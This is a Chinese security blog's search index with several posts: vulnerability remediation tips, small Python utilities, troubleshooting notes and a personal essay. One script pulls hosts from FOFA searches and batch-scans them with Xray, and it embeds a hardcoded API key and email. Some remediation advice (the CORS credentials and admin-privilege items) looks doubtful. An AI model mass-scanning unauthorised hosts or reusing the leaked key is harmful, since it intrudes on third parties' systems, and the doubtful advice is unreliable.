<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>常见漏洞整改建议</title>
    <url>/2020/12/09/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%95%B4%E6%94%B9%E5%BB%BA%E8%AE%AE/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>常见漏洞的整改措施，可用于SRC、渗透报告的简要描述；<br>此建议仅供在大方向上参考，具体整改措施应根据业务系统实际情况而定。</p>
<a id="more"></a>

<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><pre><code>验证所有输入数据，有效检测攻击；对所有输出数据进行适当的编码，以防止任何已成功注入的脚本在浏览器端运行。具体如下 ：
    1.输入验证：某个数据被接受为可被显示或存储之前，使用标准输入验证机制，验证所有输入数据的长度、类型、语法以及业务规则。
    2.输出编码：数据输出前，确保用户提交的数据已被正确进行entity编码，建议对所有字符进行编码而不仅局限于某个子集。
    3.明确指定输出的编码方式：不要允许攻击者为你的用户选择编码方式(如ISO8859-1或 UTF 8)。
    4.警惕规范化错误：验证输入之前，必须进行解码及规范化以符合应用程序当前的内部表示方法。请确定应用程序对同一输入不做两次解码。
    5.对客户端提交的数据进行过滤，一般建议过滤掉双引号（”）、尖括号（&lt;、&gt;）等特殊字符，或者对客户端提交的数据中包含的特殊字符进行实体转换，常见过滤符号如下所示：|&amp;; $%,\&apos;&quot;&lt;&gt;() 
    6.在不影响应用的前提下，建议将cookie标记为httpOnly，同时禁用TRACE方法。
    7.html实体编码。</code></pre><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><pre><code>1.通过referer判断页面来源进行CSRF防护，该方式无法防止站内CSRF攻击及referer字段伪造。
2.重要功能点使用动态验证码进行CSRF防护。
3.通过token方式进行CSRF防护。
4.为每个session创建唯一的随机字符串，并在受理请求时验证。</code></pre><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><pre><code>1.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件，那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。
2.禁用不需要的协议，仅仅允许http和https请求。可以防止file/gopher/dict等协议引起的问题。
3.设置URL白名单或者限制内网IP。（使用gethostbyname()判断是否为内网IP）
4.限制请求的端口为http常用的端口，比如 80、443、8080、8090
5.统一配置错误信息，避免用户可以根据错误信息来判断远程服务器的端口状态。</code></pre><h2 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h2><pre><code>1.过滤 \r 、\n 之类的行结束符，避免输入的数据污染其他 HTTP 首部字段。</code></pre><h2 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h2><pre><code>1.不信任未经身份验证的跨域请求，应该首先验证Session ID或者Cookie。

2.对于请求方来说验证接收的数据有效性，服务方仅暴露最少最必须的功能。

3.通过多种条件屏蔽掉非法的请求，例如HTTP头、参数等。

4.将Access-Control-Allow-Credentials设置为true，启用凭据传输。

5.设置固定的Access-Control-Allow-Origin，而不是根据用户跨域请求数据的Origin来定。</code></pre><h2 id="SQLInject"><a href="#SQLInject" class="headerlink" title="SQLInject"></a>SQLInject</h2><pre><code>1.程序代码里的所有查询语句，使用标准化的数据库查询语句API接口，设定语句的参数进行过滤一些非法的字符，防止用户输入恶意的字符传入到数据库中执行sql语句。

2.对用户提交的的参数进行严格的安全过滤，如’、”、&lt;、&gt;、/、*、;、+、-、&amp;、|、(、)、and、or、select、union等，并进行相关字符进行转义操作,以及编码的安全转换。

3.网站的代码层编码尽量统一，建议使用utf8编码，如果代码里的编码都不一样，会导致一些过滤被直接绕过。

4.网站的数据类型，必须确定，是数字型，就是数字型，字符型就是字符型，数据库里的存储字段类型也设置为ini型。

5.对用户的操作权限进行安全限制，普通用户只给普通权限，管理员后台的操作权限要放开，尽量减少对数据库的恶意攻击。

6.网站的报错信息尽量不要返回给客户端，比如一些字符错误，数据库的报错信息，尽可能的防止泄露给客户端。</code></pre><h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><pre><code>1.对该功能所有的查询接口进行权限控制。
2.严格校验用户权限。</code></pre><h2 id="目录浏览"><a href="#目录浏览" class="headerlink" title="目录浏览"></a>目录浏览</h2><pre><code>1.可以在每个目录下创建一个空的index.html页面。
2.设置目录访问权限。
3.针对不同的中间件有不同的配置修改方案，如下：
    ▪ IIS
    打开 IIS 管理器，然后导航至您要管理的级别；
    在“功能视图”中，双击“目录浏览”；
    在“操作”窗格中，选择“目录浏览”功能，单击“禁用”。
    ▪ Apache
    修改Apache配置文件[httpd.conf]，搜索“Options Indexes FollowSymLinks”，修改为“Options -Indexes FollowSymLinks”即可。
    Indexes 的作用就是当该目录下没有 index.html 文件时，就显示目录结构，去掉 Indexes，Apache 就不会显示该目录的列表了。
    在Indexes前，加 + 代表允许目录浏览；加 – 代表禁止目录浏览。这样的话就属于整个Apache禁止目录浏览了。
    通过.htaccess文件，可以在根目录新建或修改 .htaccess 文件中添加如下代码就可以禁止Apache显示目录索引:
    ▪ Nginx
    找到Nginx配置文件中的“autoindex”，设置为“off”即可。
    ▪ Tomcat
    在应用的WEB-INF目录找到web.xml配置文件，将“listings”参数的初始化值设置为“false”</code></pre><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><pre><code>1.过滤点、斜杠、反斜杠等特殊字符，使用户在url中不能回溯上级目录。
2.文件命名为复杂名字，采用随机生成方式进行命名。
3.控制文件访问权限。</code></pre><h2 id="短信轰炸"><a href="#短信轰炸" class="headerlink" title="短信轰炸"></a>短信轰炸</h2><pre><code>1.限制单个IP单位时间内获取短信验证码的请求次数；合理配置短信接口，对于同一手机号码，发送次数不超过3-5次，并且对发送的时间间隔做限制。
2.加强发送验证码处时间限制的逻辑性。
3.限制单用户发送上限，即设置每个用户单位时间内发送短信数的上限，如果超过阈值就不允许今天再次调用短信接口。
4.在页面中加入验证码逻辑校验。    </code></pre><h2 id="明文传输"><a href="#明文传输" class="headerlink" title="明文传输"></a>明文传输</h2><pre><code>1.对明文传输密码字段进行加密。
    ▪ 使用公开加密方式并进加盐加密；
    ▪ 使用私有加密方式；</code></pre><h2 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h2><pre><code>对传入的URL做有效性的认证，保证该URL来自于信任域。限制的方式可参考以下两种：
    1.限制Referer（Referer是HTTP header中的字段，当浏览器向web服务器发送请求时，一般会带上Referer，告诉服务器是从哪个页面链接过来的），通过限制Referer保证将要跳转URL的有效性，避免攻击者生成自己的恶意跳转链接；
    2.加入有效性验证Token，保证所有生成的链接都来自于可信域，通过在生成的链接里加入用户不可控的Token对生成的链接进行校验。</code></pre><h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><pre><code>1.对接口进行权限控制校验,严格校验cookie、源……；</code></pre><h2 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h2><pre><code>1.对登录的判断回显修改为一致。：用户名或密码错误或其他模糊提示。
2.限制请求时间间隔</code></pre><h2 id="验证码爆破"><a href="#验证码爆破" class="headerlink" title="验证码爆破"></a>验证码爆破</h2><pre><code>1.增加短信验证码复杂度或者长度，建议不少于6位。
2.缩短验证码有效期，建议不超过1分钟。
3.验证码错误次数超过上限应采取账户锁定策略。</code></pre><h2 id="Session复用"><a href="#Session复用" class="headerlink" title="Session复用"></a>Session复用</h2><pre><code>1.用户退出系统后，服务器端应清空此用户的Session信息。</code></pre><h2 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h2><pre><code>1.最有效的，将文件上传目录直接设置为不可执行，对于Linux而言，撤销其目录的&apos;x&apos;权限；实际中很多大型网站的上传应用都会放置在独立的存储上作为静态文件处理，一是方便使用缓存加速降低能耗，二是杜绝了脚本执行的可能性。
2.文件类型检查：建议使用白名单方式，结合MIME Type、后缀检查等方式（即只允许允许的文件类型进行上传。
3.使用随机数改写文件名和文件路径，使得用户不能轻易访问自己上传的文件。</code></pre><h2 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h2><pre><code>1.对用户传过来的文件名参数进行硬编码或统一编码，对文件类型进行白名单控制，对包含恶意字符或者空字符的参数进行拒绝。
2.文件路径保存至数据库，让用户提交文件对应ID下载文件。
3.用户下载文件之前需要进行权限判断。
4.文件放在web无法直接访问的目录下。
5.不允许提供目录遍历服务。
6.公开文件可放置在web应用程序下载目录中通过链接进行下载。</code></pre><h2 id="任意账号注册"><a href="#任意账号注册" class="headerlink" title="任意账号注册"></a>任意账号注册</h2><pre><code>1.不要将返回信息直接显示在返回包中。
2.注册时对验证码进行更严格的逻辑验证。</code></pre><h2 id="任意密码重置"><a href="#任意密码重置" class="headerlink" title="任意密码重置"></a>任意密码重置</h2><pre><code>1.服务端对验证码进行验证，结果为true时直接跳到下一步，无需向客户端单独返回验证结果。
2.输入新的密码，然后提交到服务端，服务端应对当前用户名、手机号、短信验证码进行二次匹配验证，都为true时，才可以修改成功。</code></pre><h2 id="用户名暴力破解"><a href="#用户名暴力破解" class="headerlink" title="用户名暴力破解"></a>用户名暴力破解</h2><pre><code>1.账户锁定
    账户锁定是很有效的方法，因为暴力破解程序在5-6次的探测中猜出密码的可能性很小。但是同时也拒绝了正常用户的使用。如果攻击者的探测是建立在用户名探测成功之后的行为，那么会造成严重的拒绝服务攻击。对于对大量用户名只用一个密码的探测攻击账户锁定无效。如果对已经锁定的账户并不返回任何信息，可能迷惑攻击者；
2.返回信息
    如果不管结果如何都返回成功的信息，破解软件就会停止攻击。但是对人来说很快就会被识破；
3.页面跳转
    产生登录错的的时候就跳到另一个页面要求重新登录。比如126和校内网都是这样做的。局限性在于不能总是跳转页面，一般只在第一次错误的时候跳转，但是第一次之后又可以继续暴力探测了；
4.适当的延时
    检查密码的时候适当的插入一些暂停，可以减缓攻击，但是可能对用户造成一定的影响；
5.封锁多次登录的IP地址
    这种方法也是有缺点的，因为攻击者可以定时更换自己的IP；
6.验证码
    验证码是阻止暴力攻击的好方法，但设计不好的验证码是可以绕过的，而且对于特定目标的手工探测来说验证码是没有作用的    ；</code></pre><h2 id="短信验证码绕过"><a href="#短信验证码绕过" class="headerlink" title="短信验证码绕过"></a>短信验证码绕过</h2><pre><code>1.系统在开发时注意验证识别后销毁session中的验证码。
2.限制用户提交的验证码不能为空。
3.判断提交的验证码与服务器上存储的是否一致。
4.禁止将验证码明文信息发送至客户端。</code></pre><h2 id="Github信息泄露"><a href="#Github信息泄露" class="headerlink" title="Github信息泄露"></a>Github信息泄露</h2><pre><code>1.及时删除github上面泄露的敏感信息。
2.员工意识培训，禁止将公司文件上传到github。</code></pre><h2 id="报错敏感信息泄露"><a href="#报错敏感信息泄露" class="headerlink" title="报错敏感信息泄露"></a>报错敏感信息泄露</h2><pre><code>1.编码时增加异常处理模块，对错误页面做统一的自定义返回界面，隐藏服务器版本信息。
2.不对外输出程序运行时产生的异常错误信息详情。</code></pre><h2 id="备份文件信息泄露"><a href="#备份文件信息泄露" class="headerlink" title="备份文件信息泄露"></a>备份文件信息泄露</h2><pre><code>1.网站管理员严格检查web中可访问的路径下是否存在备份文件，常见备份文件后缀为.jsp.bak、.bak、.sql、.txt、等等。如果有这些文件，直接将该备份文件进行转移到其他目录或者直接删除即可。
2.严格控制可网站可访问目录下的文件敏感度的存放问题，不要将敏感文件置于该目录。</code></pre>]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Python_CreatFolder文件批量处理</title>
    <url>/2020/11/30/Python-CreatFolder%E6%96%87%E4%BB%B6%E6%89%B9%E9%87%8F%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>因业务需要大量创建文件并复制相同内容</p>
<p>功能： 按行读取txt内的文件名，在指定路径下创建n个新文件夹，并将指定文件内的所有文件复制到每一个新文件夹内。</p>
<p>环境： python3</p>
<p>使用：创建name.txt放入文件名，更改file_path为指定文件夹的路径，更改with open为name.txt 的路径。其余功能可通过其余注释代码进行自由配置； </p>
<a id="more"></a>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">from</span> glob2 <span class="keyword">import</span> glob</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># def mycopyfile(srcfile, dstpath):  # 复制函数</span></span><br><span class="line"><span class="comment">#     # 如果不存在就提示不存在</span></span><br><span class="line"><span class="comment">#     if not os.path.isfile(srcfile):</span></span><br><span class="line"><span class="comment">#         print("%s not exist!" % (srcfile))</span></span><br><span class="line"><span class="comment">#     else:</span></span><br><span class="line"><span class="comment">#         fpath, fname = os.path.split(srcfile)  # 分离文件名和路径</span></span><br><span class="line"><span class="comment">#         if not os.path.exists(dstpath):</span></span><br><span class="line"><span class="comment">#             os.makedirs(dstpath)  # 创建路径</span></span><br><span class="line"><span class="comment">#         shutil.copy(srcfile, dstpath + fname)  # 复制文件</span></span><br><span class="line"><span class="comment">#         print("copy %s -&gt; %s" % (srcfile, dstpath + fname))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># # 被复制的文件夹路径</span></span><br><span class="line"><span class="comment"># src_dir = 'C:/Users/dell/Desktop/xxx/'</span></span><br><span class="line"><span class="comment"># # 目标路径</span></span><br><span class="line"><span class="comment"># dst_dir = './copy/'  # 目的路径记得加斜杠</span></span><br><span class="line"><span class="comment"># src_file_list = glob(src_dir + '*')  # glob获得路径下所有文件，可根据需要修改</span></span><br><span class="line"><span class="comment"># for srcfile in src_file_list:</span></span><br><span class="line"><span class="comment">#     mycopyfile(srcfile, dst_dir)  # 复制文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取目录下文件列表</span></span><br><span class="line"><span class="comment"># v_foleder='C:/Users/dell/Desktop/xxx/xxx/'</span></span><br><span class="line"><span class="comment"># Vname_list=os.listdir(v_foleder)</span></span><br><span class="line"><span class="comment"># print(Vname_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定路径创建新文件夹</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"C:/Users/dell/Desktop/name.txt"</span>,<span class="string">"r"</span>,encoding=<span class="string">"UTF-8"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        folder_name= line.strip(<span class="string">'\n'</span>)</span><br><span class="line">        <span class="comment"># print(folder_name)</span></span><br><span class="line">        file_path = <span class="string">'C:/Users/dell/Desktop/评估/'</span>+ folder_name</span><br><span class="line">        <span class="comment"># print(file_path)</span></span><br><span class="line">        <span class="comment"># file_path2 = file_path + "/xxx"</span></span><br><span class="line">        <span class="comment"># print(file_path2)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(file_path): <span class="comment"># 判断文件夹是否已经存在,不存在就创建，并且复制文件进去；</span></span><br><span class="line">            <span class="comment"># 新建文件夹</span></span><br><span class="line">            os.mkdir(file_path)</span><br><span class="line">            <span class="comment"># os.mkdir(file_path2)</span></span><br><span class="line">            <span class="comment"># 复制文件夹进去</span></span><br><span class="line">            <span class="comment"># for srcfile in src_file_list:</span></span><br><span class="line">            <span class="comment">#     # print(srcfile)</span></span><br><span class="line">            <span class="comment">#     shutil.copy(srcfile, file_path2)</span></span><br><span class="line">            print(<span class="string">'[+] '</span>+ file_path + <span class="string">'-------- 创建成功'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[-] '</span>+ file_path + <span class="string">'-------- 目录已存在'</span>)</span><br><span class="line">print(<span class="string">"[-] 文件处理结束"</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>脚本工具</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>深信服VPN下使用burp无法进行内网操作</title>
    <url>/2020/11/30/%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E4%B8%8B%E4%BD%BF%E7%94%A8burp%E6%97%A0%E6%B3%95%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h1 id="0X00-问题"><a href="#0X00-问题" class="headerlink" title="0X00 问题"></a>0X00 问题</h1><p>某次客户内部渗透，需要使用深信服VPN进入内网,使用VPN后发现无法访问内网资源，并且burp收不到请求，无法进一步测试；</p>
<a id="more"></a>

<p>1、火狐浏览器使用burp代理，无法访问；同时使用其他浏览器，可正常访问；<br>2、chrome浏览器使用burp代理，无法访问；同时使用其他浏览器，可正常访问；<br>3、虚拟机内NAT模式下使用burp，可以访问；</p>
<h1 id="0X01-解决"><a href="#0X01-解决" class="headerlink" title="0X01 解决"></a>0X01 解决</h1><p>猜测是深信服VPN对burp流量有默认策略<br>1、本地开启socks进行流量妆发，burp内设置使用socks代理，可正常访问，但是访问速度会降低；</p>
<p>2、在虚拟机内进行测试；</p>
]]></content>
      <categories>
        <category>疑难杂症</category>
      </categories>
      <tags>
        <tag>Web渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Python_FOFASearch+Xray批量漏扫</title>
    <url>/2020/11/30/FOFASearch/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>功能：通过调用FOFA api批量提取数据,并自动生成Xray批量bat脚本;</p>
<p>环境：python3</p>
<a id="more"></a>
<p>说明：自用脚本，因此写死了email和key；普通会员只能取前100条，因此写死了page和size；自动生成Xray批量bat，通过注释main中的CreatXraybat()可取消该功能；以上灵活配置，按需更改；</p>
<p>使用：配置好email和key，运行后按照提示输入FOFA语法，运行完成后将在当前目录下生成result_url.txt和scan.bat；在Xray目录下使用scan.bat将自动使用Xray基础爬虫进行批量扫描并生成html报告；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">                   </span></span><br><span class="line"><span class="string">    [   Date  ] :  2020/11/18 17:09   </span></span><br><span class="line"><span class="string">    [  Author ] :  ggboom993</span></span><br><span class="line"><span class="string">    V1.0:   实现基本功能，获取Fofa数据</span></span><br><span class="line"><span class="string">    V1.1:   优化回显，加入调用API的返回状态判断；</span></span><br><span class="line"><span class="string">    V1.2:   加入可输出批量Xray_bat脚本；优化回显</span></span><br><span class="line"><span class="string">    V1.3    模块化，加入DOS参数运行（暂未投入使用），优化使用，写死email和key仅供个人使用。</span></span><br><span class="line"><span class="string">    V1.4    普通会员只能查前100条数据，因此写死page 和 size；只有语句是自定义的</span></span><br><span class="line"><span class="string">    V1.5    对提取到的url通过正则匹配统一为https://的形式，以解决xray有时无法扫描www开头域名的情况</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> getopt</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">调用Fofa API 获取数据，并生成文件</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fofa_result</span><span class="params">(search)</span>:</span></span><br><span class="line">    email = <span class="string">"ggboom993@foxmail.com"</span>    <span class="comment"># 填入FofaEmail</span></span><br><span class="line">    key = <span class="string">"3f5b4146ffb8229f1231f5511053b782"</span>  <span class="comment"># 填入FofaKey</span></span><br><span class="line">    <span class="comment"># search = 'title="中医院"'   # 搜索语法</span></span><br><span class="line">    target = base64.b64encode(search.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">"utf-8"</span>)   <span class="comment"># 建立访问目标</span></span><br><span class="line">    page = <span class="string">"1"</span>    <span class="comment"># 翻页数,默认为1；如需要第二页数据时需要在下方url后加入page参数: page=</span></span><br><span class="line">    size = <span class="string">"100"</span>  <span class="comment"># 每页返回记录数；普通会员每天免费100个，所以此处使用默认100即可</span></span><br><span class="line"></span><br><span class="line">    url = <span class="string">"https://fofa.so/api/v1/search/all?email="</span>+email+<span class="string">"&amp;key="</span>+key+<span class="string">"&amp;qbase64="</span>+target+<span class="string">"&amp;size="</span>+size+<span class="string">"&amp;page="</span>+page</span><br><span class="line"></span><br><span class="line">    response = requests.get(url)    <span class="comment"># 获取request结果</span></span><br><span class="line">    print(<span class="string">"[+] Get Request Connecting"</span>)</span><br><span class="line">    res_data = json.loads(response.text) <span class="comment"># 返回json形式数据结果</span></span><br><span class="line">    print(<span class="string">"[+] Get Response Data"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> response.status_code!=<span class="number">200</span>:   <span class="comment"># 判断状态码，不为200则回显错误信息,否则开始写文件</span></span><br><span class="line">        print(<span class="string">"[-] End: Error , "</span>+res_data[<span class="string">'errmsg'</span>]+<span class="string">" No files were created "</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[+] Recording the file"</span>)</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'result_url.txt'</span>,<span class="string">'w+'</span>) <span class="keyword">as</span> f:   <span class="comment"># 写文件操作</span></span><br><span class="line">             <span class="keyword">for</span> i <span class="keyword">in</span> res_data[<span class="string">'results'</span>]:</span><br><span class="line">                 <span class="comment"># print(i[0])</span></span><br><span class="line">                 f.write(i[<span class="number">0</span>]+<span class="string">'\n'</span>) <span class="comment"># 写入results中的url，并换行</span></span><br><span class="line">        print(<span class="string">"[-] End: Success ! Result written in file 'result_url.txt'"</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">创建批量Xray_bat脚本；</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CreatXraybat</span><span class="params">()</span>:</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'scan.bat'</span>,<span class="string">'w+'</span>) <span class="keyword">as</span> a:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'result_url.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> b:</span><br><span class="line">                <span class="keyword">for</span> line <span class="keyword">in</span> b.readlines():</span><br><span class="line">                    url = line.strip(<span class="string">'\n'</span>)</span><br><span class="line">                    <span class="comment"># 在URL中正则匹配http://  http无法使用https；https使用http则会自动跳转成https，因此使用http</span></span><br><span class="line">                    <span class="keyword">if</span> re.match(<span class="string">r"[http:]+//"</span>, url,re.I):</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        url = <span class="string">"http://"</span> + url</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># 写bat文件</span></span><br><span class="line">                    bat_string = <span class="string">"xray webscan --basic-crawler &#123;&#125; --html-output &#123;&#125;.html \n"</span>.format(url,i)</span><br><span class="line">                    i=i+<span class="number">1</span></span><br><span class="line">                    a.write(bat_string)</span><br><span class="line">        print(<span class="string">"[-] End: Success ! Xray_Script written in file 'scan.bat'"</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        print(<span class="string">"[-] End: Error , Xray_Script written Fail no such file 'result_url.txt'"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">参数执行,感觉用参数反而不方便，会有遗漏参数导致使用FOFA_API的默认配置</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def opt():</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        opts,args = getopt.getopt(argv,["email=","key=","target=","page=","size=","help"],)</span></span><br><span class="line"><span class="string">    except getopt.GetoptError:</span></span><br><span class="line"><span class="string">        print('----------------------------\n--email    FOFA_Email[example@gmail.com]\n--key  FOFA_Key[5fd6946705a59example2a7u7eb1194]\n--target    SearchString[title="OA"]\n--page   Search PageNum[1]\n--size    One Page ResultSize[100]\n--help   View Help to Use-------------------------')</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"""</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">___________________  ________________   </span></span><br><span class="line"><span class="string">\_   _____/\_____  \ \_   _____/  _  \  </span></span><br><span class="line"><span class="string"> |    __)   /   |   \ |    __)/  /_\  \ </span></span><br><span class="line"><span class="string"> |     \   /    |    \|     \/    |    \ </span></span><br><span class="line"><span class="string"> \___  /   \_______  /\___  /\____|__  /</span></span><br><span class="line"><span class="string">     \/            \/     \/         \/  API_v1.5                  </span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">                    Direct by  ggboom993</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    """</span>)</span><br><span class="line"></span><br><span class="line">    search = input(<span class="string">"FOFA语法："</span>)</span><br><span class="line">    Fofa_result(search)</span><br><span class="line">    CreatXraybat()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>脚本工具</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>python下使用scapy模块报错</title>
    <url>/2020/07/09/python%E4%B8%8B%E4%BD%BF%E7%94%A8scapy%E6%A8%A1%E5%9D%97%E6%8A%A5%E9%94%99/</url>
    <content><![CDATA[<h1 id="0x00-问题"><a href="#0x00-问题" class="headerlink" title="0x00 问题"></a>0x00 问题</h1><p>python下使用scapy模块进行发包时报错：FATAL Bad Memory Block.（致命的坏内存块。）</p>
<a id="more"></a>

<img src="/2020/07/09/python下使用scapy模块报错/1.png">

<h1 id="0x01-解决"><a href="#0x01-解决" class="headerlink" title="0x01 解决"></a>0x01 解决</h1><p>针对scapy的该特定错误，百度没有找到明确解决方案。经过多处搜索，发现类似的问题在NMAP扫描时也出现过，主要原因是winpcap冲突。</p>
<p>检查本地winpcap，果然有两个版本同时存在，一为10.xx 二为4.xx<br>卸载10.xx 重新运行一下程序 正常运行</p>
<img src="/2020/07/09/python下使用scapy模块报错/2.png">
]]></content>
      <categories>
        <category>疑难杂症</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>低头才是成长的标志</title>
    <url>/2020/07/07/%E4%BD%8E%E5%A4%B4%E6%89%8D%E6%98%AF%E6%88%90%E9%95%BF%E7%9A%84%E6%A0%87%E5%BF%97/</url>
    <content><![CDATA[<blockquote>
<p>从高考走向生活——从反抗到身不由己</p>
</blockquote>
<a id="more"></a>

<p>7月7号，以往此时最能让人想起的是“七七事变”，而今天绝大多数人关注的是这独特而又不独特的高考。是的，2020年，高考延期一个月。</p>
<p>我的整个高中时期，可以说90%没有在学习。作为从农村转学去城市上学的一名学生，学校一开始就将我分配在最差的班里，成绩最差的班。为什么我要强调一遍成绩最差？因为在整个高中时期，最值得让我回忆的就是这个班了，也很不幸，之后成绩突出被调去实验班了。这些个故事，都不是重点，日后有机会仍然能讲给熟悉的或者不熟悉的、人生过客也好、白头终老也罢。</p>
<p>总之，我的高中是失败的，我的高考也是失败的，但是丝毫不会影响我对未来每次高考的辩思，我对生活的辩思。</p>
<p>我是一个极度不情愿学习的人，我这里说的“学习”指的是很纯粹的学习应式教材书本知识，所以即使我上了大学已经作为一个“过来人”经历了高考，并且对其心生遗憾的同时，我依旧没有任何考研的想法。</p>
<p>教材上的知识，是让我很不屑且愤慨的。这样的知识在我看来是非常不符合“知识”存在的真正意义，也偏离了“知识”应该给我们带来的正确影响，本该和其本心从根源处接受转化，却变成了浮躁的带有目的的应试产物。总是思考这些问题着实让我心里感到难受，于是我抗拒，我不学，我说要当圣人，生活都是世俗之物，真正的知识才能让人升华。没错，我高中就是这样想的，谁还没有个中二的时代呢。因此才有了我开始讲的小插曲，我学习不好，我抗拒学习等等。当然这些都是我的个人原因，并不能代表大众，不能代表每一个高中学子。有可能某个学生只是单纯的不喜欢学习，还有可能他只是没有学习的天赋，我们不能否定每个行为每个工作都离不开讨论天赋这个问题。但是不管你出于什么理由，大多数人都很难对高中学习报以极大的热情，确实如此。语文一门卷子，数学一门卷子，英语一门卷子，生物一门卷子……门门老师都说，我的作业不多，门门老师都忘了“不积小流无以成江海”。 这就是现实，那有多少人能996学习一天，晚上回去还热情高涨的刷完十套卷子？其实是没有的。你喜欢吃巧克力，我让你天天吃巧克力，007的吃巧克力你也会吃腻，你没法热情高涨。可能会人有问，那为什么学霸就可以？其实学霸也不可以，只是学霸低头了。</p>
